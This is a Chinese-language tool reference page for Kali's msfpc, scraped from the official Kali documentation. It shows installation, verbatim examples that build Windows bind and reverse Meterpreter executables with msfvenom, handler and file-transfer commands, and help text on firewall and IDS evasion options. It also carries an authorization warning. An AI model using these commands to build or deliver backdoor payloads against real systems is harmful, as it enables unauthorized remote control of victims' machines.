# msfpc

> MSFvenom Payload Creator (MSFPC) A quick way to generate various “basic” Meterpreter payloads using msfvenom which is part of the Metasploit framework.

> **功能分类**：漏洞利用 ｜ **Kali 包**：`msfpc` ｜ **官方文档**：<https://www.kali.org/tools/msfpc/>

## 1. 安装

```bash
sudo apt update
sudo apt install msfpc
```

| 项目 | 内容 |
|------|------|
| 版本 | 1.4.5 |
| 架构 | any |
| 可执行命令 | `msfpc` |
| 依赖 | `metasploit-framework` |
| 安装体积 | 58 KB |
| 官网 | <https://github.com/g0tmi1k/msfpc> |
| 源码仓库 | <https://gitlab.com/kalilinux/packages/msfpc> |
| 包追踪 | <https://pkg.kali.org/pkg/msfpc> |

## 2. 官方用法示例

> 以下为 Kali 官方工具页给出的示例与输出原文。

```text
Usage Examples
Semi-interactively create a Windows Meterpreter bind shell on port 5555.
root@kali:~# msfpc windows bind 5555 verbose
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

 [i] Use which interface - IP address?:
 [i]   1.) lo - 127.0.0.1
 [i]   2.) eth0 - 172.16.193.160
 [i]   3.) wan - 68.151.240.61
 [?] Select 1-3, interface or IP address: 2

 [i]        IP: 172.16.193.160
 [i]      PORT: 5555
 [i]      TYPE: windows (windows/meterpreter/bind_tcp)
 [i]     SHELL: meterpreter
 [i] DIRECTION: bind
 [i]     STAGE: staged
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p windows/meterpreter/bind_tcp -f exe \
  --platform windows -a x86 -e generic/none  LPORT=5555 \
  > '/root/windows-meterpreter-staged-bind-tcp-5555.exe'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-bind-tcp-5555.exe'

 [i] File: PE32 executable (GUI) Intel 80386, for MS Windows
 [i] Size: 76K
 [i]  MD5: 5bdb434e053fa0a9894eb88720c09e2a
 [i] SHA1: 9d51c45c76dfd947994cb4be61f5f9797b35167f

 [i] MSF handler file: '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!

Automatically generate a Windows reverse Meterpreter payload, using the IP address of the eth0 interface as the LHOST parameter.
```

## 3. 命令与参数（官方 help / man 原文）

本包提供 1 个可执行命令，下面是官方页面内嵌的帮助原文。

### `msfpc`

官方给出的调用示例：`msfpc windows bind 5555 verbose`

```text
root@kali:~# msfpc windows bind 5555 verbose
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i] Use which interface - IP address?:
 [i]   1.) lo - 127.0.0.1
 [i]   2.) eth0 - 172.16.193.160
 [i]   3.) wan - 68.151.240.61
 [?] Select 1-3, interface or IP address: 2
 [i]        IP: 172.16.193.160
 [i]      PORT: 5555
 [i]      TYPE: windows (windows/meterpreter/bind_tcp)
 [i]     SHELL: meterpreter
 [i] DIRECTION: bind
 [i]     STAGE: staged
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p windows/meterpreter/bind_tcp -f exe \
  --platform windows -a x86 -e generic/none  LPORT=5555 \
  > '/root/windows-meterpreter-staged-bind-tcp-5555.exe'
 [i] windows meterpreter created: '/root/windows-meterpreter-staged-bind-tcp-5555.exe'
 [i] File: PE32 executable (GUI) Intel 80386, for MS Windows
 [i] Size: 76K
 [i]  MD5: 5bdb434e053fa0a9894eb88720c09e2a
 [i] SHA1: 9d51c45c76dfd947994cb4be61f5f9797b35167f
 [i] MSF handler file: '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-bind-tcp-5555-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
Automatically generate a Windows reverse Meterpreter payload, using the IP address of the eth0 interface as the LHOST parameter.
```

### `msfpc（示例）`

官方给出的调用示例：`msfpc windows eth0`

```text
root@kali:~# msfpc windows eth0
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i]   IP: 172.16.193.160
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=172.16.193.160 LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'
 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'
 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
```

### `msfpc（示例）`

官方给出的调用示例：`msfpc -h`

```text
root@kali:~# msfpc -h
 [*] MSFvenom Payload Creator (MSFPC v1.4.5)
 /usr/bin/msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
   Example: /usr/bin/msfpc windows 192.168.1.10        # Windows & manual IP.
            /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
            /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.
            /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
            /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
            /usr/bin/msfpc help verbose                # Help screen, with even more information.
 <TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .exe // .dll]
 Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.
 Missing <DOMAIN/IP> will default to the IP menu.
 Missing <PORT> will default to 443.
 <CMD> is a standard/native command prompt/terminal to interactive with.
 <MSF> is a custom cross platform shell, gaining the full power of Metasploit.
 Missing <CMD/MSF> will default to <MSF> where possible.
 <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 Missing <BIND/REVERSE> will default to <REVERSE>.
 <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.
 <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.
 Missing <STAGED/STAGELESS> will default to <STAGED> where possible.
 <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.
 Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.
 <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT>
 <LOOP> will just create one of each <TYPE>.
 <VERBOSE> will display more information.
Updated on: 2025-Dec-09
 Edit this page
mongo-tools
name-that-hash
LIGHT
DARK
Links
Home
Download / Get Kali
Blog
OS Documentation
Tool Documentation
System Status
Archived Releases
Partnerships
Platforms
ARM (SBC)
NetHunter (Mobile)
Amazon AWS
Docker
Linode
Microsoft Azure
Microsoft Store (WSL)
Vagrant
Development
Bug Tracker
Continuous Integration
Network Mirror
Package Tracker
GitLab
Community
Discord
Support Forum
PeerTube
Follow Us
Bluesky
Facebook
Instagram
Mastodon
Substack
X
Newsletter
RSS
Policies
Cookie Policy
Privacy Policy
Trademark Policy
© OffSec Services Limited 2026. All rights reserved.
Kali Linux is part of OffSec's Community Projects
Learn more about OffSec's free, open-source penetration testing tools for cybersecurity professionals
```

## 4. 实践清单

按顺序做完这五步，就能把工具从「装上」推进到「会用」：

- [ ] **1.** **装好并确认版本** —— `sudo apt install msfpc`，再执行 `msfpc --version` 2>/dev/null || `msfpc -V`
- [ ] **2.** **读官方帮助** —— `msfpc -h`，需要细节时 `man msfpc`
- [ ] **3.** **在自有靶场跑最小用例** —— 用 `msfpc -h` 里最简单的那个子命令试一次
- [ ] **4.** **对照官方文档确认参数语义** —— <https://www.kali.org/tools/msfpc/>，重点核对上一步用到的每个参数
- [ ] **5.** **记录输出并解读** —— 把关键字段抄进笔记，写清「它说明什么」「下一步该做什么」

> ⚠️ 只在**自己的设备**或**获得书面授权**的目标上使用。未授权扫描/入侵在多数司法辖区构成违法。
> 靶场搭建见 [`../../labs/README.md`](../../labs/README.md)。

## 5. 相关

- 精讲教程：本工具暂无专篇，可在 [`../../tools/tutorials/`](../../tools/tutorials/) 中按分类查阅同类工具
- 按攻击阶段浏览同类工具：[`../../tools/by-attack/resource-development.md`](../../tools/by-attack/resource-development.md)
- 按包速查：[`../catalog/`](../catalog/) ｜ 全量清单：[`../catalog/all-tools.md`](../catalog/all-tools.md)
- Kali 官方工具页：<https://www.kali.org/tools/msfpc/>

---

## 来源

- 工具元数据与用法示例、help 原文均抓取自 <https://www.kali.org/tools/msfpc/>（同步日期：2026-09-15）
- 抓取与生成脚本：`scripts/fetch_kali_tools.py` · `scripts/fetch_kali_usage.py` · `scripts/gen_kali_reference.py`
